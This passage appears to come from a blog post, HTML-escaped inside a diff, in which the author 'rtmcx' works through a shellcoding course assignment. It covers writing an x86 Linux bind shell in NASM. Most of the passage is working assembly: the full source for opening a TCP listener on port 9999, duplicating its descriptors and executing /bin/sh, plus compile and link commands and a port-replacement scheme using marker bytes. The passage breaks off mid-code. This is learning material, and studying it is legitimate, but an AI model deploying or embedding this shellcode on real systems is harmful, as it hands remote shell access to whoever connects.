+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x03&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; Start value for counter&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;         &lt;span class=&quot;c&quot;&gt;; decrese ecx&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3f&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; syscall for dup2&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; Execute syscall&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;jnz&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; If ecx i not zero, next iteration&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;execve&quot;&gt;Execve&lt;/h2&gt;
+&lt;p&gt;Finally, we execute the “Execve”-syscall&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;; EXECVE&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; Setup execve&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; execve (&quot;/bin/sh&quot;, NULL, NULL)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; Zero eax&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; push 0 used as a terminator&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x68732f6e&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;; hs/n in hex&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x69622f2f&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;; ib//  in hex&lt;/span&gt;
+
+    &lt;span class=&quot;c&quot;&gt;; Set up ebx for syscall&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; Put address to //bin/sh0x0 in ebx&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; Put a zero in ecx&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; Put a zero in edx&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xb&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;; Syscall for execve&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; Execute syscall&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The full code is as follows:&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;; Bind shell in nasm&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;; Author: rtmcx&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;; &lt;/span&gt;
+
+&lt;span class=&quot;kr&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_start&lt;/span&gt;
+
+&lt;span class=&quot;kr&quot;&gt;section&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;_start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;; The following actions must be performed:&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;; Create a socket&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;; Bind the socket&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;; Listen for connection&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;; Accept a connection&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;; Copy socket to stdio, stdout, stderr&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;; Execve /bin/sh&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;; Socket functions are used by the socketcall syscall&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;; int socketcall(int call, unsigned long *args);&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;; socketcall = 102 (0x66) &lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;; /usr/include/linux/net.h &lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;; Socket =1     &lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;; Bind = 2&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;; Listen = 4&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;; Accept = 5             &lt;/span&gt;
+
+
+    &lt;span class=&quot;c&quot;&gt;; Create a socket using socketcall&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; sockfd = socket(int socket_family, int socket_type, int protocol);&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; eax = 0x66    (socketcall syscall)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; ebx = 1 (Bind) &lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; ecx = args for bind&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;; SOCKET    &lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;       &lt;span class=&quot;c&quot;&gt;; Syscall for socketcall&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;         &lt;span class=&quot;c&quot;&gt;; in eax&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; Socketcall-number for socket&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebx&lt;/span&gt;         &lt;span class=&quot;c&quot;&gt;; Put in ebx&lt;/span&gt;
+        
+    &lt;span class=&quot;c&quot;&gt;; Set up the args for socket&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; cat /usr/include/linux/in.h &lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; PUSH protocol, type and domain&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; Protocol: TCP=0, Type: SOCK_STREAM = 1, Domain: INET = 2&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edi&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; Make edi null&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edi&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; This is &#39;Protocol&#39; TCP = 0&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebx&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; ebx already has 1 in it, reuse for Type&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8002&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;; Inet = 2.&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; Put &#39;pointer&#39; to args in ecx (args to socketcall)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; execute syscall. &lt;/span&gt;
+
+    &lt;span class=&quot;c&quot;&gt;; Now we have a socketfd in eax&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;xchg&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; Save socketfd in esi (as we need it later on)&lt;/span&gt;
+
+
+&lt;span class=&quot;c&quot;&gt;; BIND&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; Set up args for &#39;Bind&#39;&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;;   int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);&lt;/span&gt;
+    
+    &lt;span class=&quot;c&quot;&gt;; ebx = socketfd (esi)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; ecx = args for bind (struct sockaddr) &lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; edx length of the args&lt;/span&gt;
+    
+    &lt;span class=&quot;c&quot;&gt;; Setup the sockaddr, push the values to the stack&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; sockaddr (2, 9999, 0)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; ADDR_FAMILY = 0, PORT = 9999, AF_INET = 2&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edi&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; edi is still 0    (ADDR_FAMILY ALL)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0f27&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;; Port 9999 in hex network byte order (0x0f27)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x02&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;; (AF_INET)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; Put pointer to args in ecx, for use with &quot;bind&quot; call  &lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bl&lt;/span&gt;          &lt;span class=&quot;c&quot;&gt;; inc ebx to 2, for &#39;Bind&#39;-socketcall number&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;       &lt;span class=&quot;c&quot;&gt;; Size of the sockaddr struct (16 bytes)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; Argv for bind&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esi&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; esi has the socketfd in it&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; Put pointer to &#39;Bind&#39;-args in ecx&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; zero out eax &lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; syscall for socketcall&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; Execute syscall&lt;/span&gt;
+
+    
+&lt;span class=&quot;c&quot;&gt;; LISTEN&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; Setup args for &#39;Listen&#39; &lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; listen(socketfd, backlog)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; Make eax null&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; push 0&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esi&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; esi has the socketfd in it &lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; Put pointer to &#39;Listen&#39;-args&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;; Syscall for listen&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; syscall for socketcall&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; Execute syscall&lt;/span&gt;
+
+
+&lt;span class=&quot;c&quot;&gt;; ACCEPT&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; Setup args for &#39;Accept&#39;&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; accept( socketfd, struct sockaddr, sizeof sockaddr)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; Since we know nothing of the client, sockaddr and it&#39;s size is set to 0   &lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edi&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; edi is still 0 (ADDR_FAMILY ALL)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edi&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; &lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esi&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; esi has the socketfd in it &lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; struct for sockaddr (client)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bl&lt;/span&gt;          &lt;span class=&quot;c&quot;&gt;; ebx has 4 since &#39;listen&#39; call. Inc to make 5 for accept&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; syscall for socketcall&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; Execute syscall&lt;/span&gt;
+
+
+&lt;span class=&quot;c&quot;&gt;; DUP2&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; Now we need to dup2 i/o-to client socketfd&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; dup2(oldfd, newfd)&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; put client socketfd (returned in eax) to ebx&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; make eax zero&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; Zero out ecx&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x03&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; Start value for counter&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;         &lt;span class=&quot;c&quot;&gt;; decrese ecx&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3f&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; syscall for dup2&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; Execute syscall&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;jnz&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; If ecx i not zero, next iteration&lt;/span&gt;
+
+
+&lt;span class=&quot;c&quot;&gt;; EXECVE&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; Setup execve&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; execve (&quot;/bin/sh&quot;, NULL, NULL)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; Zero eax&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; push 0 used as a terminator&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x68732f6e&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;; hs/n in hex&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x69622f2f&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;; ib//  in hex&lt;/span&gt;
+
+    &lt;span class=&quot;c&quot;&gt;; Set up ebx for syscall&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; Put address to //bin/sh0x0 in ebx&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; Put a zero in ecx&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; Put a zero in edx&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xb&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;; Syscall for execve&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; Execute syscall&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Compile and link the program:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+rtmcx@parrot &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nasm -f elf32 &lt;span class=&quot;nb&quot;&gt;bind&lt;/span&gt;-shell.nasm -o &lt;span class=&quot;nb&quot;&gt;bind&lt;/span&gt;-shell.o
+rtmcx@parrot &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ld -m elf_i386 &lt;span class=&quot;nb&quot;&gt;bind&lt;/span&gt;-shell.o -o &lt;span class=&quot;nb&quot;&gt;bind&lt;/span&gt;-shell
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;To avoid doing this every time, I wrote a script that compiles, links, extracts the shellcode, create a shellcode c-program generator and compiles it. 
+The script is based on Vivek’s code from the course.&lt;/p&gt;
+
+&lt;h2 id=&quot;replace-port-number&quot;&gt;Replace port number&lt;/h2&gt;
+&lt;p&gt;After the bind-shell is complete, next up is complete the requirrement “Port number should be easily conﬁgurable”.
+The easiest way to change the port number is using a script that takes a port number, converts it into hex and reverse the byte order.
+The portnumber bytes is then replaced in the shellcode.&lt;/p&gt;
+
+&lt;p&gt;Instead of creating a new, separate script that performs these task, I decided to include them into the compiler script. 
+The port number is then feed into the script as an commandline argument:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rtmcx@parrot &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/compile.sh &lt;span class=&quot;nb&quot;&gt;bind&lt;/span&gt;-shell 1337
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Compiling with nasm...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Linking with ld...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;---] Replacing the port to 1337
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;To be able to do this dynamicly, we need to replace the port number-push in the shellcode with “marker bytes”, so that we can find the correct place in the shellcode. 
+this is done in the ‘Bind’-call:&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c&quot;&gt;; Set up args for &#39;Bind&#39;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edi&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; edi is still 0    (ADDR_FAMILY ALL)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xaaaa&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;; Marker bytes for compile script&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x02&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;; (AF_INET)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;script&quot;&gt;script&lt;/h3&gt;
+
+&lt;p&gt;I wont go over the entire script in this post, as the script is commented and self-explanatory, but the actual replacement is done like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;shellcode &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
